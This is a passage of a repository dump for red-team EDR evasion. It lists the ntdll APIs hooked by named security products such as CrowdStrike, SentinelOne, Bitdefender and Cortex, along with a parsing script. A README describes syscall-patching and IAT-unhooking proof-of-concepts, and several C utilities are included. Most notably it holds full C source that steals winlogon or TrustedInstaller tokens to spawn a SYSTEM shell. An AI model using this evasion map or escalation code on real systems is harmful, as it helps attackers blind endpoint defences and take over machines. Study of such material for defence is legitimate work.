|\n| ZwQueueApcThreadEx                       | FALSE  | TRUE        | FALSE  | FALSE  | FALSE  | TRUE        | FALSE     | TRUE    | FALSE        | TRUE        | FALSE    |\n| ZwReadVirtualMemory                      | TRUE   | TRUE        | FALSE  | TRUE   | FALSE  | TRUE        | FALSE     | TRUE    | FALSE        | TRUE        | FALSE    |\n| ZwRenameKey                              | FALSE  | FALSE       | FALSE  | FALSE  | FALSE  | FALSE       | FALSE     | FALSE   | FALSE        | FALSE       | TRUE     |\n| ZwResumeThread                           | FALSE  | TRUE        | FALSE  | FALSE  | TRUE   | TRUE        | FALSE     | FALSE   | TRUE         | FALSE       | FALSE    |\n| ZwSetContextThread                       | FALSE  | TRUE        | FALSE  | TRUE   | TRUE   | TRUE        | FALSE     | FALSE   | TRUE         | FALSE       | FALSE    |\n| ZwSetInformationFile                     | FALSE  | FALSE       | FALSE  | FALSE  | FALSE  | FALSE       | FALSE     | FALSE   | FALSE        | FALSE       | TRUE     |\n| ZwSetInformationProcess                  | FALSE  | TRUE        | FALSE  | FALSE  | FALSE  | TRUE        | FALSE     | TRUE    | FALSE        | FALSE       | FALSE    |\n| ZwSetInformationThread                   | FALSE  | TRUE        | FALSE  | FALSE  | FALSE  | TRUE        | FALSE     | FALSE   | FALSE        | FALSE       | FALSE    |\n| ZwSetValueKey                            | FALSE  | FALSE       | FALSE  | FALSE  | FALSE  | FALSE       | FALSE     | FALSE   | FALSE        | FALSE       | TRUE     |\n| ZwSuspendThread                          | FALSE  | FALSE       | FALSE  | FALSE  | FALSE  | TRUE        | FALSE     | FALSE   | FALSE        | FALSE       | FALSE    |\n| ZwTerminateProcess                       | TRUE   | TRUE        | FALSE  | FALSE  | FALSE  | FALSE       | FALSE     | FALSE   | FALSE        | FALSE       | TRUE     |\n| ZwTerminateThread                        | FALSE  | FALSE       | FALSE  | FALSE  | FALSE  | FALSE       | FALSE     | FALSE   | FALSE        | FALSE       | TRUE     |\n| ZwUnmapViewOfSection                     | FALSE  | TRUE        | FALSE  | TRUE   | TRUE   | TRUE        | FALSE     | TRUE    | FALSE        | TRUE        | FALSE    |\n| ZwUnmapViewOfSectionEx                   | FALSE  | FALSE       | FALSE  | FALSE  | FALSE  | TRUE        | FALSE     | FALSE   | FALSE        | FALSE       | FALSE    |\n| ZwWriteFile                              | FALSE  | FALSE       | FALSE  | FALSE  | FALSE  | FALSE       | FALSE     | FALSE   | FALSE        | TRUE        | FALSE    |\n| ZwWriteVirtualMemory                     | TRUE   | TRUE        | FALSE  | TRUE   | TRUE   | TRUE        | FALSE     | TRUE    | TRUE         | TRUE        | FALSE    |\n"
        },
        {
          "name": "Parse.py",
          "type": "blob",
          "size": 0.80859375,
          "content": "#!/usr/bin/python3\n\n# Usage: python3 Parse.py > out.csv\n\nfrom os import listdir\nfrom os.path import isfile, join\nimport os,sys\nimport tabulate\nmypath = '.'\nonlyfiles = [f for f in listdir(mypath) if isfile(join(mypath, f))]\ntxtfiles = [f for f in onlyfiles if (\".txt\" in f)]\nhooks = []\nsuper = {}\n\nfor f in txtfiles:\n\tj = open(f, 'r')\n\tfor i in j.readlines():\n\t\tz = i.split(' ')[0]\n\t\tif(not(z.strip() in hooks)):\n\t\t\thooks.append(z.strip())\n\t# prepare array\nhooks.sort()\n\t\t\nfor f in txtfiles:\n\tj = open(f, 'r')\n\tedr = f.split('.')[0]\n\tsuper[edr] = {}\n\tfor h in hooks:\n\t\tsuper[edr][h.strip()] = \"FALSE\"\n\tfor i in j.readlines():\n\t\tz = i.split(' ')[0]\n\t\tsuper[edr][z.strip()] = \"TRUE\"\n\n\nheader = \"{},{}\".format('EDR',','.join(hooks))\nprint(header)\n\nfor edr in super.keys():\n\tprint('{},{}'.format(edr,','.join(super[edr].values())))\n"
        },
        {
          "name": "README.md",
          "type": "blob",
          "size": 3.7001953125,
          "content": "# EDRs\n\nThis repo contains information about EDRs that can be useful during red team exercise.\n\n\n# patch_syscall_dynamically64.c\n\nThis proof-of-concept is resolving the syscall ID dynamically no need to check the version running on the remote host. To get the information on disk (not tampered) a call to `CreateFileMapping` and `MapViewOfFile` Windows APIs is performed. The DLL is then parsed to retrived the data and used to patch the live code.\n\n# patch_syscall64.c\n\nThis proof-of-concept is patching the syscall ID specified in the code. The live version of the DLL is then patched using the hardcoded syscall ID and reverted to the original unpatched state.\n\n# get_syscall64.c\n\nThis utility is used to retrived the sycall ID associated with a Windows API.\n\n```\nget_syscall64.exe ntdll.dll NtOpenProcess\n\nntdll.dll!NtOpenProcess at 0x00007FF873F6CAD0\nNtOpenProcess syscall ID 0x00000026 (38)\n```\n\n# unhookIAT.c\n\nThis proof-of-concept detects hooks placed by EDR/AV/Malware in the Import Address Table and replace them with original addresses ([coded by xalicex](https://github.com/xalicex/Unhook-Import-Address-Table)).\n\n\n# Excel version of the list of hooks\n\n[EDRs.xlsx formatted by Vincent Yiu](https://github.com/Mr-Un1k0d3r/EDRs/blob/main/EDRs.xlsx)\n\n# Markdown version of the list of hooks\n\n[EDRs.md formatted by Vincent Yiu](https://github.com/Mr-Un1k0d3r/EDRs/blob/main/EDRs.md)\n\n# EDRs Hooked APIs\n\nWant to contribute simply run `hook_finder64.exe C:\\windows\\system32\\ntdll.dll` and submit the output.\n\n### CrowdStrike hooked ntdll.dll APIs\n\n[CrowdStrike hooks list](https://raw.githubusercontent.com/Mr-Un1k0d3r/EDRs/main/crowdstrike.txt)\n\nThe newer version moved away from UMH and instead rely on kernel callback as shown below:\n\n![kernel callback](https://github.com/Mr-Un1k0d3r/EDRs/raw/main/kernel-callback.png)\n\n\n### SentinelOne hooked ntdll.dll APIs\n\n[SentinelOne hooks list](https://raw.githubusercontent.com/Mr-Un1k0d3r/EDRs/main/sentinelone.txt)\n\n### Cylance hooked ntdll.dll APIs (Thanks to Seemant Bisht)\n\n[Cylance hooks list](https://raw.githubusercontent.com/Mr-Un1k0d3r/EDRs/main/cylance.txt)\n\n### Sophos hooked ntdll.dll APIs\n\n[Sophos hooks list](https://raw.githubusercontent.com/Mr-Un1k0d3r/EDRs/main/sophos.txt)\n\n### Attivo Deception hooked ntdll.dll APIs\n\n[Attivo hooks list](https://raw.githubusercontent.com/Mr-Un1k0d3r/EDRs/main/attivo.txt)\n\n### CarbonBlack hooked ntdll.dll APIs (Thanks to Hackndo)\n\n[CarbonBlack hooks list](https://raw.githubusercontent.com/Mr-Un1k0d3r/EDRs/main/carbonblack.txt)\n\n### Symantec hooked ntdll.dll APIs (Thanks to CarsonSallis)\n\n[Symantec hooks list](https://raw.githubusercontent.com/Mr-Un1k0d3r/EDRs/main/symantec.txt)\n\n### DeepInstinct hooked ntdll.dll APIs (Thanks to P0chAcc0)\n\n[DeepInstinct hooks list](https://raw.githubusercontent.com/Mr-Un1k0d3r/EDRs/main/deepinstinct.txt)\n\n### McAfee hooked ntdll.dll APIs\n\n[McAfee hooks list](https://raw.githubusercontent.com/Mr-Un1k0d3r/EDRs/main/mcafee.txt)\n\n## CheckPoint SandBlast hooked ntdll APIs\n\n[CheckPoint SandBlast hooks list](https://github.com/Mr-Un1k0d3r/EDRs/blob/main/checkpoint-sandblast.txt)\n\n## ESET endpoint Security 8.0.2028.0 hooked ntdll APIs\n\n[Eset hooks list](https://github.com/Mr-Un1k0d3r/EDRs/blob/main/eset.txt)\n\n## TrendMicro 17.7.1130 hooked ntdll APIs\n\n[TrendMicro hooks list](https://github.com/Mr-Un1k0d3r/EDRs/blob/main/trend.txt)\n\n### Cortex XDR hooked APIs (KERNEL MODE)\n\n:warning: These hooks are set kernel mode. They can't be unhooked from the user mode\n\n[Cortex XDR hooks list](https://raw.githubusercontent.com/Mr-Un1k0d3r/EDRs/main/cortex.txt)\n\n## Bitdefender hooked ntdll APIs\n\n[Bitdefender hooks list](https://github.com/Mr-Un1k0d3r/EDRs/blob/main/bitdefender.txt)\n\n## Credit\nMr.Un1k0d3r RingZer0 Team\n\nAnd the whole community <3\n"
        },
        {
          "name": "attivo.txt",
          "type": "blob",
          "size": 0.4287109375,
          "content": "LdrOpenImageFileOptionsKey is hooked\nNtCreateProcessEx is hooked\nNtCreateSection is hooked\nNtOpenProcess is hooked\nNtProtectVirtualMemory is hooked\nNtReadVirtualMemory is hooked\nNtTerminateProcess is hooked\nNtWriteVirtualMemory is hooked\nZwCreateProcessEx is hooked\nZwCreateSection is hooked\nZwOpenProcess is hooked\nZwProtectVirtualMemory is hooked\nZwReadVirtualMemory is hooked\nZwTerminateProcess is hooked\nZwWriteVirtualMemory is hooked\n"
        },
        {
          "name": "bitdefender.txt",
          "type": "blob",
          "size": 1.8359375,
          "content": "NtAdjustPrivilegesToken is hooked\nNtAlpcConnectPort is hooked\nNtAlpcCreatePort is hooked\nNtAlpcSendWaitReceivePort is hooked\nNtClose is hooked\nNtCommitTransaction is hooked\nNtCreateProcess is hooked\nNtCreateProcessEx is hooked\nNtCreateSection is hooked\nNtCreateSectionEx is hooked\nNtCreateThread is hooked\nNtCreateThreadEx is hooked\nNtCreateTransaction is hooked\nNtCreateUserProcess is hooked\nNtDuplicateObject is hooked\nNtMapViewOfSection is hooked\nNtOpenProcess is hooked\nNtQuerySystemEnvironmentValueEx is hooked\nNtQueueApcThread is hooked\nNtRaiseHardError is hooked\nNtReadVirtualMemory is hooked\nNtResumeThread is hooked\nNtRollbackTransaction is hooked\nNtSetContextThread is hooked\nNtSetInformationThread is hooked\nNtSetInformationTransaction is hooked\nNtSetSystemEnvironmentValueEx is hooked\nNtTerminateProcess is hooked\nNtUnmapViewOfSection is hooked\nNtWriteFile is hooked\nNtWriteVirtualMemory is hooked\nRtlAllocateHeap is hooked\nRtlWow64SetThreadContext is hooked\nZwAdjustPrivilegesToken is hooked\nZwAlpcConnectPort is hooked\nZwAlpcCreatePort is hooked\nZwAlpcSendWaitReceivePort is hooked\nZwClose is hooked\nZwCommitTransaction is hooked\nZwCreateProcess is hooked\nZwCreateProcessEx is hooked\nZwCreateSection is hooked\nZwCreateSectionEx is hooked\nZwCreateThread is hooked\nZwCreateThreadEx is hooked\nZwCreateTransaction is hooked\nZwCreateUserProcess is hooked\nZwDuplicateObject is hooked\nZwMapViewOfSection is hooked\nZwOpenProcess is hooked\nZwQuerySystemEnvironmentValueEx is hooked\nZwQueueApcThread is hooked\nZwRaiseHardError is hooked\nZwReadVirtualMemory is hooked\nZwResumeThread is hooked\nZwRollbackTransaction is hooked\nZwSetContextThread is hooked\nZwSetInformationThread is hooked\nZwSetInformationTransaction is hooked\nZwSetSystemEnvironmentValueEx is hooked\nZwTerminateProcess is hooked\nZwUnmapViewOfSection is hooked\nZwWriteFile is hooked\nZwWriteVirtualMemory is hooked"
        },
        {
          "name": "carbonblack.txt",
          "type": "blob",
          "size": 0.4091796875,
          "content": "NtAllocateVirtualMemory is hooked\nNtCreateThread is hooked\nNtCreateThreadEx is hooked\nNtMapViewOfSection is hooked\nNtOpenProcess is hooked\nNtProtectVirtualMemory is hooked\nNtQueryInformationProcess is hooked\nNtQuerySystemInformation is hooked\nNtQuerySystemTime is hooked\nNtQueueApcThread is hooked\nNtQueueApcThreadEx is hooked\nNtReadVirtualMemory is hooked\nNtUnmapViewOfSection is hooked\nNtWriteVirtualMemory is hooked\n"
        },
        {
          "name": "checkpoint-sandblast.txt",
          "type": "blob",
          "size": 2.5283203125,
          "content": "C:\\Users\\test\\Downloads>hook_finder64.exe C:\\windows\\system32\\ntdll.dll\nLoading C:\\windows\\system32\\ntdll.dll\nHookFinder Mr.Un1k0d3r RingZer0 Team\nC:\\Users\\test\\Downloads\\hook_finder64.exe is loaded at 0x0000000000400000.\nC:\\Windows\\SYSTEM32\\ntdll.dll is loaded at 0x00007FFEC84E0000.\nC:\\Windows\\System32\\KERNEL32.DLL is loaded at 0x00007FFEC83E0000.\nC:\\Windows\\System32\\KERNELBASE.dll is loaded at 0x00007FFEC6140000.\nC:\\Program Files (x86)\\CheckPoint\\Endpoint Security\\EFR\\SBA_ISWWH.dll is loaded at 0x00000000627A0000.\nC:\\Program Files (x86)\\CheckPoint\\Endpoint Security\\EFR\\cphnt64.dll is loaded at 0x00007FFEACBF0000.\nC:\\Windows\\SYSTEM32\\apphelp.dll is loaded at 0x00007FFEC3600000.\nC:\\Windows\\System32\\msvcrt.dll is loaded at 0x00007FFEC70A0000.\nC:\\Program Files (x86)\\CheckPoint\\Endpoint Security\\EFR\\cphusr64.dll is loaded at 0x00007FFEB9010000.\n------------------------------------------\nBASE                    0x00007FFEC84E0000      MZÃ‰\nPE                      0x00007FFEC84E00D8      PE\nExportTableOffset       0x00007FFEC862C500\nOffsetNameTable         0x00007FFEC862EA54\nFunctions Count         0x94b (2379)\n------------------------------------------\nCsrClientConnectToServer is hooked\nNtAllocateVirtualMemory is hooked\nNtCreateEvent is hooked\nNtCreateMutant is hooked\nNtCreateSemaphore is hooked\nNtCreateThread is hooked\nNtCreateThreadEx is hooked\nNtFreeVirtualMemory is hooked\nNtMapViewOfSection is hooked\nNtOpenEvent is hooked\nNtOpenMutant is hooked\nNtOpenSemaphore is hooked\nNtProtectVirtualMemory is hooked\nNtQueueApcThread is hooked\nNtQueueApcThreadEx is hooked\nNtResumeProcess is hooked\nNtResumeThread is hooked\nNtSetContextThread is hooked\nNtSetInformationThread is hooked\nNtSuspendProcess is hooked\nNtSuspendThread is hooked\nNtTerminateProcess is hooked\nNtTerminateThread is hooked\nNtUnmapViewOfSection is hooked\nNtWriteVirtualMemory is hooked\nZwAllocateVirtualMemory is hooked\nZwCreateEvent is hooked\nZwCreateMutant is hooked\nZwCreateSemaphore is hooked\nZwCreateThread is hooked\nZwCreateThreadEx is hooked\nZwFreeVirtualMemory is hooked\nZwMapViewOfSection is hooked\nZwOpenEvent is hooked\nZwOpenMutant is hooked\nZwOpenSemaphore is hooked\nZwProtectVirtualMemory is hooked\nZwQueueApcThread is hooked\nZwQueueApcThreadEx is hooked\nZwResumeProcess is hooked\nZwResumeThread is hooked\nZwSetContextThread is hooked\nZwSetInformationThread is hooked\nZwSuspendProcess is hooked\nZwSuspendThread is hooked\nZwTerminateProcess is hooked\nZwTerminateThread is hooked\nZwUnmapViewOfSection is hooked\nZwWriteVirtualMemory is hooked\n------------------------------------------\nCompleted\n"
        },
        {
          "name": "cortex.txt",
          "type": "blob",
          "size": 2.0849609375,
          "content": "User-Mode hoooks\n- JMP Based Hook:\n    NtAllocateVirtualMemory\n    NtFreeVirtualMemory\n    NtSetInformationProcess\n- PUSH; RET Based Hook:\n    NtMapViewOfSection\n    NtUnmapViewOfSection\n    NtContinue\n\n\nRegNtCallbackObjectContextCleanup\nRegNtPostCreateKey\nRegNtPostCreateKeyEx\nRegNtPostDeleteKey\nRegNtPostDeleteValueKey\nRegNtPostEnumerateKey\nRegNtPostEnumerateValueKey\nRegNtPostFlushKey\nRegNtPostKeyHandleClose\nRegNtPostLoadKey\nRegNtPostOpenKey\nRegNtPostOpenKeyEx\nRegNtPostQueryKey\nRegNtPostQueryKeyName\nRegNtPostQueryKeySecurity\nRegNtPostQueryMultipleValueKey\nRegNtPostQueryValueKey\nRegNtPostRenameKey\nRegNtPostReplaceKey\nRegNtPostRestoreKey\nRegNtPostSaveKey\nRegNtPostSetInformationKey\nRegNtPostSetKeySecurity\nRegNtPostSetValueKey\nRegNtPostUnLoadKey\nRegNtPreCreateKey\nRegNtPreCreateKeyEx\nRegNtPreDeleteKey\nRegNtPreDeleteValueKey\nRegNtPreEnumerateKey\nRegNtPreEnumerateValueKey\nRegNtPreFlushKey\nRegNtPreKeyHandleClose\nRegNtPreLoadKey\nRegNtPreOpenKey\nRegNtPreOpenKeyEx\nRegNtPreQueryKey\nRegNtPreQueryKeyName\nRegNtPreQueryKeySecurity\nRegNtPreQueryMultipleValueKey\nRegNtPreQueryValueKey\nRegNtPreRenameKey\nRegNtPreReplaceKey\nRegNtPreRestoreKey\nRegNtPreSaveKey\nRegNtPreSetInformationKey\nRegNtPreSetKeySecurity\nRegNtPreSetValueKey\nRegNtPreUnLoadKey\nNtAddBootEntry\nNtAdjustPrivilegesToken\nNtAllocateVirtualMemory\nNtAllocateVirtualMemoryEx\nNtCreateMutant\nNtDelayExecution\nNtDeleteBootEntry\nNtGdiBitBlt\nNtLoadDriver\nNtMapViewOfSection\nNtMapViewOfSectionEx\nNtModifyBootEntry\nNtOpenCreateFile\nNtOpenProcessToken\nNtOpenProcessTokenEx\nNtOpenThreadToken\nNtOpenThreadTokenEx\nNtProtectVirtualMemory\nNtQueryInformationTokenTokenUser\nNtQuerySystemInformation\nNtQueueApcThread\nNtQueueApcThreadEx\nNtQueueApcThreadEx2\nNtReadVirtualMemory\nNtSetContextThread\nNtSetInformationProcess\nNtSetInformationProcessCriticalProcess\nNtSetInformationThreadCriticalThread\nNtSetInformationThreadHideFromDebugger\nNtSetInformationThreadImpersonationToken\nNtSetInformationThreadWow64Context\nNtSetInformationVirtualMemory\nNtSystemDebugControl\nNtUnmapViewOfSection\nNtUnmapViewOfSectionEx\nNtUserGetAsyncKeyState\nNtUserGetClipboardData\nNtUserSetWindowsHookEx\nNtWriteVirtualMemory\n"
        },
        {
          "name": "crowdstrike.txt",
          "type": "blob",
          "size": 1.146484375,
          "content": "NtAllocateVirtualMemory is hooked\nNtAllocateVirtualMemoryEx is hooked\nNtDeviceIoControlFile is hooked\nNtGetContextThread is hooked\nNtMapViewOfSection is hooked\nNtMapViewOfSectionEx is hooked\nNtProtectVirtualMemory is hooked\nNtQueryInformationThread is hooked\nNtQueueApcThread is hooked\nNtQueueApcThreadEx is hooked\nNtReadVirtualMemory is hooked\nNtResumeThread is hooked\nNtSetContextThread is hooked\nNtSetInformationProcess is hooked\nNtSetInformationThread is hooked\nNtSuspendThread is hooked\nNtUnmapViewOfSection is hooked\nNtUnmapViewOfSectionEx is hooked\nNtWriteVirtualMemory is hooked\nZwAllocateVirtualMemory is hooked\nZwAllocateVirtualMemoryEx is hooked\nZwDeviceIoControlFile is hooked\nZwGetContextThread is hooked\nZwMapViewOfSection is hooked\nZwMapViewOfSectionEx is hooked\nZwProtectVirtualMemory is hooked\nZwQueryInformationThread is hooked\nZwQueueApcThread is hooked\nZwQueueApcThreadEx is hooked\nZwReadVirtualMemory is hooked\nZwResumeThread is hooked\nZwSetContextThread is hooked\nZwSetInformationProcess is hooked\nZwSetInformationThread is hooked\nZwSuspendThread is hooked\nZwUnmapViewOfSection is hooked\nZwUnmapViewOfSectionEx is hooked\nZwWriteVirtualMemory is hooked\n"
        },
        {
          "name": "cylance.txt",
          "type": "blob",
          "size": 0.8671875,
          "content": "NtAllocateVirtualMemory is hooked\nNtCreateProcess is hooked\nNtCreateProcessEx is hooked\nNtCreateThread is hooked\nNtCreateThreadEx is hooked\nNtCreateUserProcess is hooked\nNtFreeVirtualMemory is hooked\nNtMapViewOfSection is hooked\nNtProtectVirtualMemory is hooked\nNtQueueApcThread is hooked\nNtQueueApcThreadEx is hooked\nNtReadVirtualMemory is hooked\nNtSetInformationProcess is hooked\nNtUnmapViewOfSection is hooked\nNtWriteVirtualMemory is hooked\nZwAllocateVirtualMemory is hooked\nZwCreateProcess is hooked\nZwCreateProcessEx is hooked\nZwCreateThread is hooked\nZwCreateThreadEx is hooked\nZwCreateUserProcess is hooked\nZwFreeVirtualMemory is hooked\nZwMapViewOfSection is hooked\nZwProtectVirtualMemory is hooked\nZwQueueApcThread is hooked\nZwQueueApcThreadEx is hooked\nZwReadVirtualMemory is hooked\nZwSetInformationProcess is hooked\nZwUnmapViewOfSection is hooked\nZwWriteVirtualMemory is hooked\n"
        },
        {
          "name": "deepinstinct.txt",
          "type": "blob",
          "size": 0.6328125,
          "content": "NtAlertResumeThread is hooked\nNtClose is hooked\nNtCreateProcess is hooked\nNtCreateProcessEx is hooked\nNtCreateSection is hooked\nNtCreateThreadEx is hooked\nNtDuplicateObject is hooked\nNtMapViewOfSection is hooked\nNtQueueApcThread is hooked\nNtResumeThread is hooked\nNtSetContextThread is hooked\nNtWriteVirtualMemory is hooked\nZwAlertResumeThread is hooked\nZwClose is hooked\nZwCreateProcess is hooked\nZwCreateProcessEx is hooked\nZwCreateSection is hooked\nZwCreateThreadEx is hooked\nZwDuplicateObject is hooked\nZwMapViewOfSection is hooked\nZwQueueApcThread is hooked\nZwResumeThread is hooked\nZwSetContextThread is hooked\nZwWriteVirtualMemory is hooked\n"
        },
        {
          "name": "dump_dll_export.c",
          "type": "blob",
          "size": 0.859375,
          "content": "#include <Windows.h>\n#include <stdio.h>\n#include <string.h>\n#include <stdlib.h>\n#include <tlhelp32.h>\n#include <winnt.h>\n\nVOID DumpListOfExport(VOID *lib) {\n\n    IMAGE_DOS_HEADER* MZ = (IMAGE_DOS_HEADER*)lib;\n    IMAGE_NT_HEADERS* PE = (IMAGE_NT_HEADERS*)((BYTE*)lib + MZ->e_lfanew);\n    IMAGE_EXPORT_DIRECTORY* export = (IMAGE_EXPORT_DIRECTORY*)((BYTE*)lib + PE->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);\n    \n    DWORD *name = (DWORD*)((BYTE*)lib + export->AddressOfNames);\n\n    DWORD i = 0;\n    for(i; i < export->NumberOfNames; i++) {\n\t\t    printf(\"%s\\n\",(CHAR*)lib + name[i]);\n\t  }    \n}\n\nint main (int argc, char **argv) {\n    CHAR *dll = argv[1];\n    HANDLE hDll = LoadLibrary(dll);\n\t\n    printf(\"Loading %s\\n\", dll);\n    if(hDll == NULL) {\n        ExitProcess(0);\n    }\n\n\t  DumpListOfExport(hDll);\n\n    CloseHandle(hDll);\n    return 0;\n}\n"
        },
        {
          "name": "dumpbytes.c",
          "type": "blob",
          "size": 0.900390625,
          "content": "#include <Windows.h>\n#include <stdio.h>\n#include <tlhelp32.h>\n\nVOID ListLoadedDlls() {\n\n    HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPMODULE, 0);\n    MODULEENTRY32 me32;\n    me32.dwSize = sizeof(MODULEENTRY32);\n\n    printf(\"Listing loaded modules inside process PID %d\\n------------------------------------------\\n\", GetCurrentProcessId());\n    if(Module32First(hSnap, &me32)) {\n        do {\n            printf(\"%s is loaded at 0x%p.\\n\", me32.szExePath, me32.modBaseAddr);\n\n        } while(Module32Next(hSnap, &me32));\n    }\n\n    CloseHandle(hSnap);\n}\n\nint main(int argc, char **argv) {\n\t\t\n\tDWORD dwSize = atoi(argv[1]);\n\tCHAR *dll = argv[2];\n\tCHAR *func = argv[3];\n\t\n\tFARPROC ptr = GetProcAddress(LoadLibrary(dll),func);\n\tprintf(\"%s!%s found at 0x%p\\n\", dll, func, ptr);\n\t\n\tCHAR *data = ptr;\n\tListLoadedDlls();\n\tDWORD i = 0;\n\tfor(i; i < dwSize; i++) {\n\t\tprintf(\"%02x\", (unsigned char)data[i]);\n\t}\n\t\n\treturn 0;\n}\n"
        },
        {
          "name": "elevate_to_system_or_trustedinstaller.c",
          "type": "blob",
          "size": 5.365234375,
          "content": "#include <windows.h>\n#include <stdio.h>\n#include <TlHelp32.h>\n\nDWORD GetProcByPID(CHAR *name);\nDWORD GetTrustedInstallerPID();\nBOOL ImpersonateByPID(DWORD PID, HANDLE *hStorage);\nBOOL ElevateSystem();\nBOOL ElevateTrustedInstaller();\n\nHANDLE hTokenSystem = NULL;\nHANDLE hTokenTrustedInstaller = NULL;\nBOOL bSpawnAsTrusted = FALSE;\n\nDWORD GetProcByPID(CHAR *name) {\n     HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);\n     DWORD PID = 0;\n     PROCESSENTRY32 pe32;\n     pe32.dwSize = sizeof(PROCESSENTRY32);\n\n     if(Process32First(hSnap, &pe32)) {\n         do {\n            if(strcmp(pe32.szExeFile, name) == 0) {\n                PID = pe32.th32ProcessID;\n                printf(\"[%s] Process %s PID is %d\\n\", __func__, name, PID);\n                break;\n            }\n         } while(Process32Next(hSnap, &pe32));\n     }\n\n     CloseHandle(hSnap);\n     return PID;\n}\n\nDWORD GetTrustedInstallerPID() {\n    DWORD PID = 0;\n    SC_HANDLE schManager = OpenSCManager(NULL, SERVICES_ACTIVE_DATABASE, SC_MANAGER_CONNECT);\n\n    if(schManager == NULL) {\n        printf(\"[%s] OpenSCManager failed. Error: %d\\n\", __func__, GetLastError());\n        return FALSE;\n    }\n\n    SC_HANDLE schService = OpenService(schManager, \"TrustedInstaller\", SERVICE_QUERY_STATUS | SERVICE_START);\n\n     if(schManager == NULL) {\n        printf(\"[%s] OpenService failed. Error: %d\\n\", __func__, GetLastError());\n        CloseHandle(schManager);\n        return FALSE;\n    }  \n    CloseHandle(schManager);\n\n    SERVICE_STATUS_PROCESS ssp;\n    DWORD dwSize = 0;\n\n    while(QueryServiceStatusEx(schService, SC_STATUS_PROCESS_INFO, (LPBYTE)&ssp, sizeof(SERVICE_STATUS_PROCESS), &dwSize)) {\n        printf(\"[%s] QueryServiceStatusEx need %d bytes.\\n\", __func__, dwSize);\n        if(ssp.dwCurrentState == SERVICE_STOPPED) {\n            if(!StartService(schService, 0, NULL)) {\n                printf(\"[%s] StartService failed. Error: %d\\n\", __func__, GetLastError());\n                CloseHandle(schService);\n                return FALSE; \n            }\n        }\n        if(ssp.dwCurrentState == SERVICE_RUNNING) {\n            PID = ssp.dwProcessId;\n            printf(\"[%s] TrustedInstaller Service PID is %d\\n\", __func__, PID);\n            break;\n        }\n        SleepEx(5000, FALSE);\n    }\n\n    CloseHandle(schService); \n    return PID;\n}\n\nBOOL ImpersonateByPID(DWORD PID, HANDLE *hStorage) {\n    HANDLE hProc = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, FALSE, PID);\n\n    if(hProc == NULL) {\n        printf(\"[%s] OpenProcess on PID %d failed. Error: %d\\n\", __func__, PID, GetLastError());\n        return FALSE;\n    }\n\n    HANDLE hToken = NULL;\n    if(!OpenProcessToken(hProc, TOKEN_DUPLICATE, &hToken)) {\n        printf(\"[%s] OpenProcessToken on PID %d failed. Error: %d\\n\", __func__, PID, GetLastError());\n        CloseHandle(hProc);\n        return FALSE;\n    }\n    CloseHandle(hProc);\n    \n    HANDLE hDup = NULL;\n    SECURITY_ATTRIBUTES sa;\n    sa.nLength = sizeof(SECURITY_ATTRIBUTES);\n    sa.lpSecurityDescriptor = NULL;\n    sa.bInheritHandle = FALSE;\n\n    if(!DuplicateTokenEx(hToken, TOKEN_ALL_ACCESS, &sa, SecurityImpersonation, TokenImpersonation, &hDup)) {\n        printf(\"[%s] DuplicateTokenEx on PID %d failed. Error: %d\\n\", __func__, PID, GetLastError());\n        CloseHandle(hToken);\n        return FALSE;       \n    }\n    CloseHandle(hToken);\n\n    if(!ImpersonateLoggedOnUser(hDup)) {\n        printf(\"[%s] ImpersonateLoggedOnUser on PID %d failed. Error: %d\\n\", __func__, PID, GetLastError());\n        CloseHandle(hDup);\n        return FALSE;            \n    }\n\n    *hStorage = hDup;\n\n    return TRUE;\n}\n\nBOOL ElevateSystem() {\n    DWORD PID = GetProcByPID(\"winlogon.exe\");\n    if(ImpersonateByPID(PID, &hTokenSystem)) {\n        printf(\"[%s] ImpersonateByPID(SYSTEM) succeeded.\\n\", __func__);\n    }\n}\n\nBOOL ElevateTrustedInstaller() {\n    DWORD PID = GetTrustedInstallerPID();\n    if(ImpersonateByPID(PID, &hTokenTrustedInstaller)) {\n        printf(\"[%s] ImpersonateByPID(TrustedInstaller) succeeded.\\n\", __func__);\n    }\n}\n\nVOID CreateProcessImpersonate(HANDLE hToken, CHAR *command) {\n    STARTUPINFOW si;\n    PROCESS_INFORMATION pi;\n    GetStartupInfoW(&si);\n    ZeroMemory(&pi, sizeof(PROCESS_INFORMATION));\n\n    DWORD dwSize = MultiByteToWideChar(CP_ACP, 0, command, -1, NULL, 0);\n    printf(\"[%s] MultiByteToWideChar need %d bytes.\\n\", __func__, dwSize);\n    WCHAR wCommand[dwSize];\n    MultiByteToWideChar(CP_ACP, 0, command, -1, (LPWSTR)wCommand, dwSize);\n\n    BOOL bResult = CreateProcessWithTokenW(hToken, LOGON_WITH_PROFILE, NULL, wCommand, CREATE_UNICODE_ENVIRONMENT, NULL, NULL, &si, &pi);\n\n    if(!bResult) {\n        printf(\"[%s] CreateProcessWithTokenW with argument '%ls'. Error: %d\\n\", __func__, wCommand, GetLastError());\n    }\n}\n\nint main(int argc, char **argv) {\n    \n    ElevateSystem();\n    if(argc >= 2) {\n        if(strcmp(argv[1], \"trusted\") == 0) {\n            bSpawnAsTrusted = TRUE;\n            ElevateTrustedInstaller();\n        }\n    }\n\n    printf(\"[%s] (SYSTEM) Token HANDLE 0x%p.\\n\", __func__, hTokenSystem);\n    printf(\"[%s] (TrustedInstaller) Token HANDLE 0x%p.\\n\", __func__, hTokenTrustedInstaller);\n\n    if(bSpawnAsTrusted) {\n        CreateProcessImpersonate(hTokenTrustedInstaller, \"cmd.exe\");\n    } else {\n        CreateProcessImpersonate(hTokenSystem, \"cmd.exe\");\n    }\n\n    if(hTokenSystem != NULL) {\n        CloseHandle(hTokenSystem);\n    }\n    if(hTokenTrustedInstaller != NULL) {\n        CloseHandle(hTokenTrustedInstaller);\n    }\n\n    return 0;\n}\n"
        },
        {
          "name": "elevate_to_system_or_trustedinstaller_bof.c",
          "type": "blob",
          "size": 6.6044921875,
